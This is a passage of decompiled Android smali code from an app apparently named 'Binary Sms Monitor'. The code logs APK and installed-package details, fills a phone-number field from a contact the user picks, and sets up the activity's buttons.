    .line 1329
    :try_start_0
    new-instance v2, Ljava/io/File;

    move-object/from16 v0, p1

    invoke-direct {v2, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 1331
    .local v2, "apksDirectory":Ljava/io/File;
    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lcom/binary/sms/receiver/SkeletonActivity;->chmodRec(Ljava/io/File;)V

    .line 1333
    invoke-virtual/range {p0 .. p0}, Lcom/binary/sms/receiver/SkeletonActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v8

    .line 1334
    .local v8, "pm":Landroid/content/pm/PackageManager;
    invoke-virtual {v2}, Ljava/io/File;->isDirectory()Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_3

    move-result v9

    if-eqz v9, :cond_0

    .line 1337
    :try_start_1
    invoke-virtual {v2}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v11

    array-length v12, v11
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_3

    const/4 v9, 0x0

    move v10, v9

    :goto_0
    if-lt v10, v12, :cond_1

    .line 1389
    :cond_0
    :goto_1
    :try_start_2
    const-string v9, "packageInfo- ************************************* by package info   ***************** "

    invoke-static {v9}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1392
    const/16 v9, 0x80

    invoke-virtual {v8, v9}, Landroid/content/pm/PackageManager;->getInstalledApplications(I)Ljava/util/List;

    move-result-object v6

    .line 1394
    .local v6, "packages":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/ApplicationInfo;>;"
    invoke-interface {v6}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v9

    :goto_2
    invoke-interface {v9}, Ljava/util/Iterator;->hasNext()Z
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_3

    move-result v10

    if-nez v10, :cond_8

    .line 1406
    .end local v2    # "apksDirectory":Ljava/io/File;
    .end local v6    # "packages":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/ApplicationInfo;>;"
    .end local v8    # "pm":Landroid/content/pm/PackageManager;
    :goto_3
    return-void

    .line 1337
    .restart local v2    # "apksDirectory":Ljava/io/File;
    .restart local v8    # "pm":Landroid/content/pm/PackageManager;
    :cond_1
    :try_start_3
    aget-object v4, v11, v10
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_3

    .line 1339
    .local v4, "f":Ljava/io/File;
    :try_start_4
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v13, "apksDirectoryPath: "

    invoke-direct {v9, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v9, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1340
    invoke-virtual {v4}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v9

    const-string v13, "apk"

    invoke-virtual {v9, v13}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v9

    if-eqz v9, :cond_4

    .line 1343
    invoke-virtual {v4}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v9

    const/16 v13, 0xf

    invoke-virtual {v8, v9, v13}, Landroid/content/pm/PackageManager;->getPackageArchiveInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v7

    .line 1344
    .local v7, "packgeInfo":Landroid/content/pm/PackageInfo;
    if-eqz v7, :cond_4

    .line 1346
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v13, "apk packgeInfo: "

    invoke-direct {v9, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1347
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v13, "apk packageName: "

    invoke-direct {v9, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v13, v7, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v9, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1348
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v13, "apk name: "

    invoke-direct {v9, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v13, v7, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    iget-object v13, v13, Landroid/content/pm/ApplicationInfo;->name:Ljava/lang/String;

    invoke-virtual {v9, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1
    .catch Ljava/lang/Throwable; {:try_start_4 .. :try_end_4} :catch_3

    .line 1352
    :try_start_5
    iget-object v9, v7, Landroid/content/pm/PackageInfo;->activities:[Landroid/content/pm/ActivityInfo;

    if-eqz v9, :cond_2

    .line 1354
    iget-object v13, v7, Landroid/content/pm/PackageInfo;->activities:[Landroid/content/pm/ActivityInfo;

    array-length v14, v13

    const/4 v9, 0x0

    :goto_4
    if-lt v9, v14, :cond_5

    .line 1358
    :cond_2
    iget-object v9, v7, Landroid/content/pm/PackageInfo;->services:[Landroid/content/pm/ServiceInfo;

    if-eqz v9, :cond_3

    .line 1360
    iget-object v13, v7, Landroid/content/pm/PackageInfo;->services:[Landroid/content/pm/ServiceInfo;

    array-length v14, v13

    const/4 v9, 0x0

    :goto_5
    if-lt v9, v14, :cond_6

    .line 1365
    :cond_3
    iget-object v9, v7, Landroid/content/pm/PackageInfo;->receivers:[Landroid/content/pm/ActivityInfo;

    if-eqz v9, :cond_4

    .line 1367
    iget-object v13, v7, Landroid/content/pm/PackageInfo;->receivers:[Landroid/content/pm/ActivityInfo;

    array-length v14, v13

    const/4 v9, 0x0

    :goto_6
    if-lt v9, v14, :cond_7

    .line 1337
    .end local v7    # "packgeInfo":Landroid/content/pm/PackageInfo;
    :cond_4
    :goto_7
    add-int/lit8 v9, v10, 0x1

    move v10, v9

    goto/16 :goto_0

    .line 1354
    .restart local v7    # "packgeInfo":Landroid/content/pm/PackageInfo;
    :cond_5
    aget-object v1, v13, v9

    .line 1355
    .local v1, "a":Landroid/content/pm/ActivityInfo;
    new-instance v15, Ljava/lang/StringBuilder;

    const-string v16, "Activity name: "

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v0, v1, Landroid/content/pm/ActivityInfo;->name:Ljava/lang/String;

    move-object/from16 v16, v0

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v15

    invoke-static {v15}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1354
    add-int/lit8 v9, v9, 0x1

    goto :goto_4

    .line 1360
    .end local v1    # "a":Landroid/content/pm/ActivityInfo;
    :cond_6
    aget-object v1, v13, v9

    .line 1361
    .local v1, "a":Landroid/content/pm/ServiceInfo;
    new-instance v15, Ljava/lang/StringBuilder;

    const-string v16, "Service name: "

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v0, v1, Landroid/content/pm/ServiceInfo;->name:Ljava/lang/String;

    move-object/from16 v16, v0

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v15

    invoke-static {v15}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1360
    add-int/lit8 v9, v9, 0x1

    goto :goto_5

    .line 1367
    .end local v1    # "a":Landroid/content/pm/ServiceInfo;
    :cond_7
    aget-object v1, v13, v9

    .line 1368
    .local v1, "a":Landroid/content/pm/ActivityInfo;
    new-instance v15, Ljava/lang/StringBuilder;

    const-string v16, "receiver name: "

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v0, v1, Landroid/content/pm/ActivityInfo;->name:Ljava/lang/String;

    move-object/from16 v16, v0

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v15

    invoke-static {v15}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0
    .catch Ljava/lang/Throwable; {:try_start_5 .. :try_end_5} :catch_3

    .line 1367
    add-int/lit8 v9, v9, 0x1

    goto :goto_6

    .line 1372
    .end local v1    # "a":Landroid/content/pm/ActivityInfo;
    :catch_0
    move-exception v3

    .line 1374
    .local v3, "e":Ljava/lang/Exception;
    :try_start_6
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v13, "getPackageArchiveInfo activity iter"

    invoke-direct {v9, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v9, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 1373
    invoke-static {v9, v3}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1
    .catch Ljava/lang/Throwable; {:try_start_6 .. :try_end_6} :catch_3

    goto :goto_7

    .line 1380
    .end local v3    # "e":Ljava/lang/Exception;
    .end local v7    # "packgeInfo":Landroid/content/pm/PackageInfo;
    :catch_1
    move-exception v3

    .line 1382
    .restart local v3    # "e":Ljava/lang/Exception;
    :try_start_7
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v13, "getPackageArchiveInfo iter"

    invoke-direct {v9, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v9, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 1381
    invoke-static {v9, v3}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2
    .catch Ljava/lang/Throwable; {:try_start_7 .. :try_end_7} :catch_3

    goto/16 :goto_7

    .line 1384
    .end local v3    # "e":Ljava/lang/Exception;
    .end local v4    # "f":Ljava/io/File;
    :catch_2
    move-exception v3

    .line 1385
    .restart local v3    # "e":Ljava/lang/Exception;
    :try_start_8
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "getPackageArchiveInfo: "

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9, v3}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_8
    .catch Ljava/lang/Throwable; {:try_start_8 .. :try_end_8} :catch_3

    goto/16 :goto_1

    .line 1402
    .end local v2    # "apksDirectory":Ljava/io/File;
    .end local v3    # "e":Ljava/lang/Exception;
    .end local v8    # "pm":Landroid/content/pm/PackageManager;
    :catch_3
    move-exception v3

    .line 1404
    .local v3, "e":Ljava/lang/Throwable;
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "getApkInfos"

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 1403
    invoke-static {v9, v3}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto/16 :goto_3

    .line 1394
    .end local v3    # "e":Ljava/lang/Throwable;
    .restart local v2    # "apksDirectory":Ljava/io/File;
    .restart local v6    # "packages":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/ApplicationInfo;>;"
    .restart local v8    # "pm":Landroid/content/pm/PackageManager;
    :cond_8
    :try_start_9
    invoke-interface {v9}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/content/pm/ApplicationInfo;

    .line 1396
    .local v5, "packageInfo":Landroid/content/pm/ApplicationInfo;
    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "packageInfo-"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5}, Landroid/content/pm/ApplicationInfo;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1397
    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "packageInfo Installed package-"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v11, v5, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1398
    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "packageInfo sourceDir-"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v11, v5, Landroid/content/pm/ApplicationInfo;->sourceDir:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1399
    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "packageInfo name-"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v11, v5, Landroid/content/pm/ApplicationInfo;->name:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V
    :try_end_9
    .catch Ljava/lang/Throwable; {:try_start_9 .. :try_end_9} :catch_3

    goto/16 :goto_2
.end method

.method public onActivityResult(IILandroid/content/Intent;)V
    .locals 15
    .param p1, "reqCode"    # I
    .param p2, "resultCode"    # I
    .param p3, "data"    # Landroid/content/Intent;

    .prologue
    .line 234
    :try_start_0
    invoke-super/range {p0 .. p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    .line 236
    packed-switch p1, :pswitch_data_0

    .line 328
    :cond_0
    :goto_0
    return-void

    .line 238
    :pswitch_0
    const/4 v1, -0x1

    move/from16 v0, p2

    if-ne v0, v1, :cond_0

    .line 255
    invoke-virtual/range {p3 .. p3}, Landroid/content/Intent;->getData()Landroid/net/Uri;

    move-result-object v2

    .line 256
    .local v2, "contactData":Landroid/net/Uri;
    invoke-virtual {p0}, Lcom/binary/sms/receiver/SkeletonActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const/4 v3, 0x0

    .line 257
    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    .line 256
    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v10

    .line 258
    .local v10, "cr":Landroid/database/Cursor;
    invoke-interface {v10}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v1

    if-eqz v1, :cond_2

    .line 261
    const-string v1, "display_name"

    invoke-interface {v10, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    .line 260
    invoke-interface {v10, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    .line 262
    .local v12, "name":Ljava/lang/String;
    const-string v1, "MyWap"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "onActivityResult name: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 278
    const-string v1, "_id"

    invoke-interface {v10, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    .line 277
    invoke-interface {v10, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    .line 280
    .local v9, "contactId":Ljava/lang/String;
    const-string v1, "MyWap"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "onActivityResult contactId: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 281
    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 280
    invoke-static {v1, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 285
    const-string v1, "has_phone_number"

    invoke-interface {v10, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    .line 284
    invoke-interface {v10, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v1

    if-lez v1, :cond_2

    .line 290
    invoke-virtual {p0}, Lcom/binary/sms/receiver/SkeletonActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    .line 291
    sget-object v4, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    .line 292
    const/4 v5, 0x0

    .line 293
    const-string v6, "contact_id = ?"

    .line 295
    const/4 v1, 0x1

    new-array v7, v1, [Ljava/lang/String;

    const/4 v1, 0x0

    aput-object v9, v7, v1

    const/4 v8, 0x0

    .line 291
    invoke-virtual/range {v3 .. v8}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v14

    .line 297
    .local v14, "pCur":Landroid/database/Cursor;
    invoke-interface {v14}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-eqz v1, :cond_1

    .line 302
    const-string v1, "data1"

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    .line 301
    invoke-interface {v14, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v13

    .line 304
    .local v13, "number":Ljava/lang/String;
    const-string v1, "MyWap"

    .line 305
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "onActivityResult contactPhoneNumber :"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 306
    invoke-virtual {v3, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ", name: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    .line 305
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 304
    invoke-static {v1, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 307
    if-eqz v13, :cond_1

    .line 308
    iget-object v1, p0, Lcom/binary/sms/receiver/SkeletonActivity;->phoneNumber:Landroid/widget/EditText;

    invoke-virtual {v1, v13}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    .line 313
    .end local v13    # "number":Ljava/lang/String;
    :cond_1
    invoke-interface {v14}, Landroid/database/Cursor;->close()V

    .line 320
    .end local v9    # "contactId":Ljava/lang/String;
    .end local v12    # "name":Ljava/lang/String;
    .end local v14    # "pCur":Landroid/database/Cursor;
    :cond_2
    invoke-interface {v10}, Landroid/database/Cursor;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_0

    .line 325
    .end local v2    # "contactData":Landroid/net/Uri;
    .end local v10    # "cr":Landroid/database/Cursor;
    :catch_0
    move-exception v11

    .line 326
    .local v11, "e":Ljava/lang/Exception;
    const-string v1, "MyWap"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "onActivityResult exception:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v3, v11}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    goto/16 :goto_0

    .line 236
    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
    .end packed-switch
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 3
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 98
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 102
    const/high16 v1, 0x7f030000

    :try_start_0
    invoke-virtual {p0, v1}, Lcom/binary/sms/receiver/SkeletonActivity;->setContentView(I)V

    .line 106
    const/high16 v1, 0x7f070000

    invoke-virtual {p0, v1}, Lcom/binary/sms/receiver/SkeletonActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/EditText;

    iput-object v1, p0, Lcom/binary/sms/receiver/SkeletonActivity;->mEditor:Landroid/widget/EditText;

    .line 117
    const v1, 0x7f070004

    invoke-virtual {p0, v1}, Lcom/binary/sms/receiver/SkeletonActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/Button;

    iget-object v2, p0, Lcom/binary/sms/receiver/SkeletonActivity;->mClearListener:Landroid/view/View$OnClickListener;

    invoke-virtual {v1, v2}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 127
    iget-object v1, p0, Lcom/binary/sms/receiver/SkeletonActivity;->mEditor:Landroid/widget/EditText;

    invoke-static {v1, p0}, Lcom/binary/sms/receiver/Logger;->setTextField(Landroid/widget/EditText;Landroid/app/Activity;)V

    .line 129
    iget-object v1, p0, Lcom/binary/sms/receiver/SkeletonActivity;->mEditor:Landroid/widget/EditText;

    const-string v2, "Binary Sms Monitor"

    invoke-virtual {v1, v2}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    .line 131
    const-string v1, "onCreate"

    const/4 v2, 0x0

    invoke-static {v1, v2}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;Z)V

    .line 134
    const v1, 0x7f070001

    invoke-virtual {p0, v1}, Lcom/binary/sms/receiver/SkeletonActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/EditText;

    iput-object v1, p0, Lcom/binary/sms/receiver/SkeletonActivity;->phoneNumber:Landroid/widget/EditText;

    .line 136
    const v1, 0x7f070002

    invoke-virtual {p0, v1}, Lcom/binary/sms/receiver/SkeletonActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/EditText;

    iput-object v1, p0, Lcom/binary/sms/receiver/SkeletonActivity;->smsBody:Landroid/widget/EditText;

    .line 138
    const v1, 0x7f070005

    invoke-virtual {p0, v1}, Lcom/binary/sms/receiver/SkeletonActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/Button;

    iput-object v1, p0, Lcom/binary/sms/receiver/SkeletonActivity;->btnContacts:Landroid/widget/Button;

    .line 140
    iget-object v1, p0, Lcom/binary/sms/receiver/SkeletonActivity;->btnContacts:Landroid/widget/Button;

    new-instance v2, Lcom/binary/sms/receiver/SkeletonActivity$3;

    invoke-direct {v2, p0}, Lcom/binary/sms/receiver/SkeletonActivity$3;-><init>(Lcom/binary/sms/receiver/SkeletonActivity;)V

    invoke-virtual {v1, v2}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 155
    const v1, 0x7f070006

    invoke-virtual {p0, v1}, Lcom/binary/sms/receiver/SkeletonActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/Button;

    iput-object v1, p0, Lcom/binary/sms/receiver/SkeletonActivity;->smsDataBtn:Landroid/widget/Button;

    .line 157
    iget-object v1, p0, Lcom/binary/sms/receiver/SkeletonActivity;->smsDataBtn:Landroid/widget/Button;

    new-instance v2, Lcom/binary/sms/receiver/SkeletonActivity$4;

    invoke-direct {v2, p0}, Lcom/binary/sms/receiver/SkeletonActivity$4;-><init>(Lcom/binary/sms/receiver/SkeletonActivity;)V

    invoke-virtual {v1, v2}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 164
    const v1, 0x7f070003

    invoke-virtual {p0, v1}, Lcom/binary/sms/receiver/SkeletonActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/Button;

    iput-object v1, p0, Lcom/binary/sms/receiver/SkeletonActivity;->btnBack:Landroid/widget/Button;

    .line 166
    iget-object v1, p0, Lcom/binary/sms/receiver/SkeletonActivity;->btnBack:Landroid/widget/Button;

    new-instance v2, Lcom/binary/sms/receiver/SkeletonActivity$5;

    invoke-direct {v2, p0}, Lcom/binary/sms/receiver/SkeletonActivity$5;-><init>(Lcom/binary/sms/receiver/SkeletonActivity;)V

    invoke-virtual {v1, v2}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 183
    :goto_0
    return-void

    .line 180
    :catch_0
